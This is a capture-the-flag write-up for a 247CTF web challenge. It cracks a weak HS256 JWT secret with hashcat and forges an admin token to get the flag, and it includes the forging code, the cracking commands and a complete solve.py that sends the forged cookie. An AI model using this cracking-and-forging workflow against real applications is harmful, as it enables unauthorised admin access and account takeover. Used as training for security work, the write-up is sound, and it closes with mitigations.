# Writeup: Forge Your Identity - 247CTF Web Challenge

## Challenge Info

- **Name**: Forge Your Identity (JWT Flag Authoriser)
- **Category**: Web
- **Platform**: 247CTF
- **URL**: `https://e2b6a2aca5431dce.247ctf.com/`

## Challenge Description

> Can you forge a new identity to upgrade your access from an anonymous user to an admin?

---

## Initial Analysis

### Reconnaissance

Upon accessing the main URL, the server directly exposes the application's source code:

```bash
$ curl https://e2b6a2aca5431dce.247ctf.com/
```

### Revealed Source Code

```python
from flask import Flask, redirect, url_for, make_response, render_template, flash
from flask_jwt_extended import JWTManager, create_access_token, jwt_optional, get_jwt_identity
from secret import secret, admin_flag, jwt_secret

app = Flask(__name__)
cookie = "access_token_cookie"

app.config['SECRET_KEY'] = secret
app.config['JWT_SECRET_KEY'] = jwt_secret
app.config['JWT_TOKEN_LOCATION'] = ['cookies']
app.config['DEBUG'] = False

jwt = JWTManager(app)

def redirect_to_flag(msg):
    flash('%s' % msg, 'danger')
    return redirect(url_for('flag', _external=True))

@jwt.expired_token_loader
def my_expired_token_callback():
    return redirect_to_flag('Token expired')

@jwt.invalid_token_loader
def my_invalid_token_callback(callback):
    return redirect_to_flag(callback)

@jwt_optional
def get_flag():
    if get_jwt_identity() == 'admin':
        return admin_flag

@app.route('/flag')
def flag():
    response = make_response(render_template('main.html', flag=get_flag()))
    response.set_cookie(cookie, create_access_token(identity='anonymous'))
    return response

@app.route('/')
def source():
    return "<pre>%s</pre>" % open(__file__).read()

if __name__ == "__main__":
    app.run()
```

### Code Analysis

**Key points identified:**

1. **Framework**: Flask with `flask_jwt_extended` for JWT authentication
2. **Token storage**: In cookies (`access_token_cookie`)
3. **Flag condition**: `get_jwt_identity() == 'admin'`
4. **Default token**: `identity='anonymous'`
5. **Imported secret**: `jwt_secret` from `secret` module

**Vulnerability**: If we can discover `jwt_secret`, we can forge a token with `identity='admin'`.

---

## JWT Token Extraction

### Obtaining the Token

```bash
$ curl -s -c cookies.txt https://e2b6a2aca5431dce.247ctf.com/flag
$ cat cookies.txt | grep access_token_cookie
```

**Token obtained:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjc3JmIjoiN2QwOTZhNWItMWQxOS00NzRhLWJkZTctNmQzNmRmYjU0Mjg3IiwianRpIjoiYjNkNTIyZjUtMzQzNy00YzEzLWI5M2UtNWU4ZDk4MTE5ZWM0IiwiZXhwIjoxNzcwMDQ2ODU3LCJmcmVzaCI6ZmFsc2UsImlhdCI6MTc3MDA0NTk1NywidHlwZSI6ImFjY2VzcyIsIm5iZiI6MTc3MDA0NTk1NywiaWRlbnRpdHkiOiJhbm9ueW1vdXMifQ.3tEWnhQoB16oiAmbqZqiGwI3MgxpLNsqmwo_hE-3G1Q
```

### Decoding the Token

A JWT has three parts separated by dots: `header.payload.signature`

**Header (Base64):**
```json
{"alg":"HS256","typ":"JWT"}
```

**Payload (Base64):**
```json
{
  "csrf": "7d096a5b-1d19-474a-bde7-6d36dfb54287",
  "jti": "b3d522f5-3437-4c13-b93e-5e8d98119ec4",
  "exp": 1770046857,
  "fresh": false,
  "iat": 1770045957,
  "type": "access",
  "nbf": 1770045957,
  "identity": "anonymous"   ← We need to change this to "admin"
}
```

---

## Attack: JWT Secret Cracking

### Strategy

The token uses the `HS256` (HMAC-SHA256) algorithm, which requires a shared secret. If the secret is weak, we can crack it with a dictionary attack.

### Tool: Hashcat

Hashcat supports JWT cracking with mode `16500`.

```bash
# Save the token to a file
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjc3JmIjoiN2QwOTZhNWItMWQxOS00NzRhLWJkZTctNmQzNmRmYjU0Mjg3IiwianRpIjoiYjNkNTIyZjUtMzQzNy00YzEzLWI5M2UtNWU4ZDk4MTE5ZWM0IiwiZXhwIjoxNzcwMDQ2ODU3LCJmcmVzaCI6ZmFsc2UsImlhdCI6MTc3MDA0NTk1NywidHlwZSI6ImFjY2VzcyIsIm5iZiI6MTc3MDA0NTk1NywiaWRlbnRpdHkiOiJhbm9ueW1vdXMifQ.3tEWnhQoB16oiAmbqZqiGwI3MgxpLNsqmwo_hE-3G1Q" > jwt.txt

# Run hashcat with rockyou.txt
hashcat -m 16500 jwt.txt rockyou.txt --force
```

### Result

```
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16500 (JWT (JSON Web Token))
Time.Started.....: Mon Feb  2 15:30:00 2026, (1 sec)
Speed.#1.........:  3472.7 kH/s
Progress.........: 2785280/14344384 (19.42%)

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.[...].3tEWnhQoB16oiAmbqZqiGwI3MgxpLNsqmwo_hE-3G1Q:wepwn247
```

**Secret found: `wepwn247`**

---

## Forging Admin Token

### Python Script

```python
import jwt
import time

secret = "wepwn247"

# Payload with identity="admin"
payload = {
    "csrf": "7d096a5b-1d19-474a-bde7-6d36dfb54287",
    "jti": "b3d522f5-3437-4c13-b93e-5e8d98119ec4",
    "exp": int(time.time()) + 3600,  # Expires in 1 hour
    "fresh": False,
    "iat": int(time.time()),
    "type": "access",
    "nbf": int(time.time()),
    "identity": "admin"  # ← CHANGED FROM "anonymous" TO "admin"
}

admin_token = jwt.encode(payload, secret, algorithm="HS256")
print(f"Admin token: {admin_token}")
```

### Forged Token

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjc3JmIjoiN2QwOTZhNWItMWQxOS00NzRhLWJkZTctNmQzNmRmYjU0Mjg3IiwianRpIjoiYjNkNTIyZjUtMzQzNy00YzEzLWI5M2UtNWU4ZDk4MTE5ZWM0IiwiZXhwIjoxNzcwMDQ5ODExLCJmcmVzaCI6ZmFsc2UsImlhdCI6MTc3MDA0NjIxMSwidHlwZSI6ImFjY2VzcyIsIm5iZiI6MTc3MDA0NjIxMSwiaWRlbnRpdHkiOiJhZG1pbiJ9.sW3pcSCWPrAwkQCuaUgkhbA9XDwpOfEZNixYNiaP2i8
```

---

## Capturing the Flag

### Request with Forged Token

```bash
curl -s -b "access_token_cookie=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjc3JmIjoiN2QwOTZhNWItMWQxOS00NzRhLWJkZTctNmQzNmRmYjU0Mjg3IiwianRpIjoiYjNkNTIyZjUtMzQzNy00YzEzLWI5M2UtNWU4ZDk4MTE5ZWM0IiwiZXhwIjoxNzcwMDQ5ODExLCJmcmVzaCI6ZmFsc2UsImlhdCI6MTc3MDA0NjIxMSwidHlwZSI6ImFjY2VzcyIsIm5iZiI6MTc3MDA0NjIxMSwiaWRlbnRpdHkiOiJhZG1pbiJ9.sW3pcSCWPrAwkQCuaUgkhbA9XDwpOfEZNixYNiaP2i8" \
  https://e2b6a2aca5431dce.247ctf.com/flag
```

### Response

```html
<div class="text-center">
  Welcome to the JWT flag authoriser!
  <div>247CTF{df766362XXXXXXXXXXXXXXXX8a4a31b3}</div>
</div>
```

---

## Flag

```
247CTF{df766362XXXXXXXXXXXXXXXX8a4a31b3}
```

---

## Attack Summary

```
┌─────────────────────────────────────────────────────────────┐
│                      ATTACK FLOW                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Source code analysis                                    │
│     └─→ Identify JWT usage and "admin" condition           │
│                                                             │
│  2. Extract JWT token from cookie                           │
│     └─→ access_token_cookie with identity="anonymous"      │
│                                                             │
│  3. Crack JWT secret with hashcat                           │
│     └─→ hashcat -m 16500 jwt.txt rockyou.txt                │
│     └─→ Secret found: "wepwn247"                            │
│                                                             │
│  4. Forge token with identity="admin"                       │
│     └─→ jwt.encode(payload, "wepwn247", algorithm="HS256")  │
│                                                             │
│  5. Send forged token to server                             │
│     └─→ GET /flag with manipulated cookie                   │
│     └─→ FLAG obtained!                                      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Files

```
/root/ctf/jwt_forge/
├── flag_auth.md          # This writeup
├── jwt.txt               # Original JWT token
└── solve.py              # Solution script
```

### solve.py

```python
#!/usr/bin/env python3
"""
247CTF - JWT Flag Authoriser Solver
"""

import jwt
import time
import requests

# Secret cracked with hashcat
SECRET = "wepwn247"
URL = "https://e2b6a2aca5431dce.247ctf.com/flag"

# Forge admin token
payload = {
    "csrf": "7d096a5b-1d19-474a-bde7-6d36dfb54287",
    "jti": "b3d522f5-3437-4c13-b93e-5e8d98119ec4",
    "exp": int(time.time()) + 3600,
    "fresh": False,
    "iat": int(time.time()),
    "type": "access",
    "nbf": int(time.time()),
    "identity": "admin"
}

admin_token = jwt.encode(payload, SECRET, algorithm="HS256")
print(f"[+] Admin token forged")

# Get flag
r = requests.get(URL, cookies={"access_token_cookie": admin_token})

import re
flag = re.search(r'247CTF\{[^}]+\}', r.text)
if flag:
    print(f"[+] Flag: {flag.group()}")
else:
    print("[-] Flag not found")
    print(r.text)
```

---

## Key Takeaways

### Exploited Vulnerabilities

1. **Source code exposure**: The `/` endpoint reveals all authentication logic
2. **Weak JWT secret**: `wepwn247` is vulnerable to dictionary attacks
3. **No secret rotation**: The same secret is used for all tokens

### Recommended Mitigations

1. **Strong secrets**: Use randomly generated secrets of at least 256 bits
2. **Don't expose code**: Never serve application source code
3. **Asymmetric algorithms**: Consider RS256 instead of HS256 to separate signing/verification
4. **Key rotation**: Implement periodic JWT secret rotation

---

## References

- [JWT.io](https://jwt.io/) - JWT Debugger
- [Hashcat Wiki - JWT](https://hashcat.net/wiki/doku.php?id=example_hashes) - Mode 16500
- [Flask-JWT-Extended](https://flask-jwt-extended.readthedocs.io/) - Documentation
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
